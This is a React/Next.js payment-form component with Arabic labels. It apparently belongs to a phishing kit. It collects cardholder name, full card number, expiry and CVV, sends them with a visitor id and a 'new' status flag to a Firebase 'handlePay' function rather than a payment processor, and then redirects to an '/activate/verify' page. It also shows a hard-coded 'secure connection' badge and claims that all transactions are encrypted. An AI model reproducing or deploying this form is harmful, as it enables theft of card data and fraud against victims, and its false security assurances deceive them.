"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { CreditCard, Calendar, ShieldCheck, CheckCircle2, AlertCircle } from "lucide-react"
import { handlePay } from "@/lib/firebase"
import { cn } from "@/lib/utils"

// Card type detection regex patterns
const CARD_PATTERNS = {
  visa: /^4/,
  mastercard: /^5[1-5]/,
  amex: /^3[47]/,
  mada: /^(4(0(0861|1757|7(197|395)|9201)|1(0685|7633|9593)|2(281(7|8|9)|8(331|67(1|2|3)))|3(1361|2328|4107|9954)|4(0(533|647|795)|5564|6(393|404|672))|5(5(036|708)|7865|8456)|6(2220|854(0|1|2|3))|8(301(0|1|2)|4783|609(4|5|6)|931(7|8|9))|93428)|5(0(4300|8160)|13213|2(1076|4(130|514)|9(415|741))|3(0906|1095|2013|5(825|989)|6023|7767|9931)|4(3(085|357)|9760)|5(4180|7606|8848)|8(5265|8(8(4(5|6|7|8|9)|5(0|1))|98(2|3))|9(005|206)))|6(0(4906|5141)|36120)|9682(0(1|2|3|4|5|6|7|8|9)|1(0|1)))/,
}

// Component for full page loader
function FullPageLoader() {
  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
      <div className="bg-white p-6 rounded-lg shadow-lg flex flex-col items-center">
        <div className="w-16 h-16 border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin mb-4"></div>
        <p className="text-lg font-medium">جاري معالجة الدفع...</p>
      </div>
    </div>
  )
}

export function PaymentForm() {
  const router = useRouter()
  const [formData, setFormData] = useState({
    cardHolder: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    status: "new",
  })
  const [loading, setLoading] = useState(false)
  const [errors, setErrors] = useState({
    cardHolder: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
  })
  const [cardType, setCardType] = useState("")
  const [isSecure, setIsSecure] = useState(true)

  // Detect card type based on number
  useEffect(() => {
    if (!formData.cardNumber) {
      setCardType("")
      return
    }

    if (CARD_PATTERNS.visa.test(formData.cardNumber)) {
      setCardType("visa")
    } else if (CARD_PATTERNS.mastercard.test(formData.cardNumber)) {
      setCardType("mastercard")
    } else if (CARD_PATTERNS.amex.test(formData.cardNumber)) {
      setCardType("amex")
    } else if (CARD_PATTERNS.mada.test(formData.cardNumber)) {
      setCardType("mada")
    } else {
      setCardType("")
    }
  }, [formData.cardNumber])

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0; i < match.length; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  const validateForm = () => {
    const newErrors = {
      cardHolder: "",
      cardNumber: "",
      expiryMonth: "",
      expiryYear: "",
      cvv: "",
    }
    let isValid = true

    // Validate card holder
    if (!formData.cardHolder.trim()) {
      newErrors.cardHolder = "يرجى إدخال اسم صاحب البطاقة"
      isValid = false
    } else if (formData.cardHolder.length < 3) {
      newErrors.cardHolder = "يجب أن يكون الاسم 3 أحرف على الأقل"
      isValid = false
    }

    // Validate card number
    if (!formData.cardNumber.trim()) {
      newErrors.cardNumber = "يرجى إدخال رقم البطاقة"
      isValid = false
    } else if (formData.cardNumber.replace(/\s/g, "").length < 16) {
      newErrors.cardNumber = "يجب أن يكون رقم البطاقة 16 رقمًا"
      isValid = false
    }

    // Validate expiry month
    if (!formData.expiryMonth) {
      newErrors.expiryMonth = "الشهر"
      isValid = false
    } else {
      const month = Number.parseInt(formData.expiryMonth)
      if (month < 1 || month > 12) {
        newErrors.expiryMonth = "غير صالح"
        isValid = false
      }
    }

    // Validate expiry year
    if (!formData.expiryYear) {
      newErrors.expiryYear = "السنة"
      isValid = false
    } else {
      const year = Number.parseInt("20" + formData.expiryYear)
      const currentYear = new Date().getFullYear()
      if (year < currentYear) {
        newErrors.expiryYear = "منتهية"
        isValid = false
      }
    }

    // Validate CVV
    if (!formData.cvv) {
      newErrors.cvv = "CVV"
      isValid = false
    } else if (formData.cvv.length < 3) {
      newErrors.cvv = "غير صالح"
      isValid = false
    }

    setErrors(newErrors)
    return isValid
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateForm()) {
      return
    }

    setLoading(true)
    const _id = window.localStorage.getItem("vistor") || ""

    try {
      await handlePay(
        {
          id: _id,
          createdDate: new Date().toDateString(),
          ...formData,
        },
        setFormData,
      )

      setTimeout(() => {
        router.push("/activate/verify")
      }, 2000)
    } catch (error) {
      setLoading(false)
      console.error("Payment error:", error)
    }
  }

  return (
    <div className="space-y-8 max-w-md mx-auto">
      <div className="flex items-center gap-3 border-b pb-4">
        <CreditCard className="h-8 w-8 text-primary" />
        <span className="text-xl font-medium">البطاقة الائتمانية</span>
        {isSecure && (
          <div className="flex items-center gap-1 mr-auto text-green-600 text-sm">
            <ShieldCheck className="h-4 w-4" />
            <span>اتصال آمن</span>
          </div>
        )}
      </div>

      <div className="bg-gradient-to-r from-primary/90 to-primary p-6 rounded-lg text-white">
        <div className="flex justify-between items-center mb-4">
          <h3 className="text-lg font-medium">طرق الدفع المقبولة</h3>
          {cardType && (
            <div className="bg-white/20 px-3 py-1 rounded-full text-sm">
              {cardType === "visa" && "Visa"}
              {cardType === "mastercard" && "Mastercard"}
              {cardType === "amex" && "American Express"}
              {cardType === "mada" && "مدى"}
            </div>
          )}
        </div>

        <div className="grid grid-cols-4 gap-5">
          <div className={cn("relative", cardType === "visa" && "ring-2 ring-white rounded-md")}>
            <Image
              src="/vv.png"
              alt="Visa"
              height={60}
              width={60}
              className="opacity-90 hover:opacity-100 transition-opacity"
            />
          </div>
          <div className={cn("relative", cardType === "mastercard" && "ring-2 ring-white rounded-md")}>
            <Image
              src="/mm.png"
              alt="Mastercard"
              height={60}
              width={60}
              className="opacity-90 hover:opacity-100 transition-opacity"
            />
          </div>
          <div className="relative">
            <Image
              src="/ay.png"
              alt="Apple Pay"
              height={60}
              width={60}
              className="opacity-90 hover:opacity-100 transition-opacity"
            />
          </div>
          <div className={cn("relative", cardType === "mada" && "ring-2 ring-white rounded-md")}>
            <Image
              src="/md.png"
              alt="Mada"
              height={60}
              width={60}
              className="opacity-90 hover:opacity-100 transition-opacity mt-2"
            />
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="space-y-4">
          <div className="space-y-2">
            <div className="relative">
              <Input
                className={cn(
                  "pr-12 py-6 text-right",
                  errors.cardHolder && "border-red-500 focus-visible:ring-red-500",
                )}
                placeholder="اسم صاحب البطاقة"
                value={formData.cardHolder}
                onChange={(e) => {
                  setFormData({ ...formData, cardHolder: e.target.value })
                  if (errors.cardHolder) {
                    setErrors({ ...errors, cardHolder: "" })
                  }
                }}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <CreditCard className="h-5 w-5 text-muted-foreground" />
              </div>
              {errors.cardHolder && (
                <div className="flex items-center gap-1 mt-1 text-red-500 text-sm">
                  <AlertCircle className="h-4 w-4" />
                  <span>{errors.cardHolder}</span>
                </div>
              )}
            </div>
          </div>

          <div className="space-y-2">
            <div className="relative">
              <Input
                className={cn(
                  "pr-12 py-6 text-right",
                  errors.cardNumber && "border-red-500 focus-visible:ring-red-500",
                )}
                placeholder="رقم البطاقة الائتمانية"
                value={formatCardNumber(formData.cardNumber)}
                onChange={(e) => {
                  const value = e.target.value.replace(/[^\d\s]/g, "")
                  setFormData({ ...formData, cardNumber: value.replace(/\s/g, "") })
                  if (errors.cardNumber) {
                    setErrors({ ...errors, cardNumber: "" })
                  }
                }}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <CreditCard className="h-5 w-5 text-muted-foreground" />
              </div>
              {cardType && (
                <div className="absolute inset-y-0 left-0 flex items-center pl-3">
                  <div className="w-10 h-6 flex items-center justify-center">
                    {cardType === "visa" && <Image src="/vv.png" alt="Visa" width={30} height={20} />}
                    {cardType === "mastercard" && <Image src="/mm.png" alt="Mastercard" width={30} height={20} />}
                    {cardType === "mada" && <Image src="/md.png" alt="Mada" width={30} height={20} />}
                  </div>
                </div>
              )}
              {errors.cardNumber && (
                <div className="flex items-center gap-1 mt-1 text-red-500 text-sm">
                  <AlertCircle className="h-4 w-4" />
                  <span>{errors.cardNumber}</span>
                </div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-3 gap-4">
            <div className="relative col-span-1">
              <Input
                className={cn(
                  "pr-10 py-6 text-center",
                  errors.expiryMonth && "border-red-500 focus-visible:ring-red-500",
                )}
                placeholder="MM"
                value={formData.expiryMonth}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "")
                  if (value.length <= 2 && (value === "" || Number.parseInt(value) <= 12)) {
                    setFormData({ ...formData, expiryMonth: value })
                    if (errors.expiryMonth) {
                      setErrors({ ...errors, expiryMonth: "" })
                    }
                  }
                }}
                maxLength={2}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <Calendar className="h-4 w-4 text-muted-foreground" />
              </div>
              {errors.expiryMonth && <div className="mt-1 text-red-500 text-sm text-center">{errors.expiryMonth}</div>}
            </div>

            <div className="relative col-span-1">
              <Input
                className={cn(
                  "pr-10 py-6 text-center",
                  errors.expiryYear && "border-red-500 focus-visible:ring-red-500",
                )}
                placeholder="YY"
                value={formData.expiryYear}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "")
                  if (value.length <= 2) {
                    setFormData({ ...formData, expiryYear: value })
                    if (errors.expiryYear) {
                      setErrors({ ...errors, expiryYear: "" })
                    }
                  }
                }}
                maxLength={2}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <Calendar className="h-4 w-4 text-muted-foreground" />
              </div>
              {errors.expiryYear && <div className="mt-1 text-red-500 text-sm text-center">{errors.expiryYear}</div>}
            </div>

            <div className="relative col-span-1">
              <Input
                className={cn("pr-10 py-6 text-center", errors.cvv && "border-red-500 focus-visible:ring-red-500")}
                placeholder="CVV"
                value={formData.cvv}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "")
                  if (value.length <= 3) {
                    setFormData({ ...formData, cvv: value })
                    if (errors.cvv) {
                      setErrors({ ...errors, cvv: "" })
                    }
                  }
                }}
                maxLength={3}
                type="password"
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <ShieldCheck className="h-4 w-4 text-muted-foreground" />
              </div>
              {errors.cvv && <div className="mt-1 text-red-500 text-sm text-center">{errors.cvv}</div>}
            </div>
          </div>
        </div>

        <div className="pt-4 space-y-4">
          <Button type="submit" className="w-full py-6 text-lg font-medium" disabled={loading}>
            {loading ? (
              <span className="flex items-center gap-2">
                <span className="h-5 w-5 border-2 border-t-transparent border-white rounded-full animate-spin"></span>
                جاري المعالجة...
              </span>
            ) : (
              <span className="flex items-center justify-center gap-2">
                <CheckCircle2 className="h-5 w-5" />
                تأكيد الدفع
              </span>
            )}
          </Button>

          <div className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
            <ShieldCheck className="h-4 w-4 text-green-600" />
            <span>جميع المعاملات مشفرة وآمنة</span>
          </div>
        </div>

        {loading && <FullPageLoader />}
      </form>
    </div>
  )
}

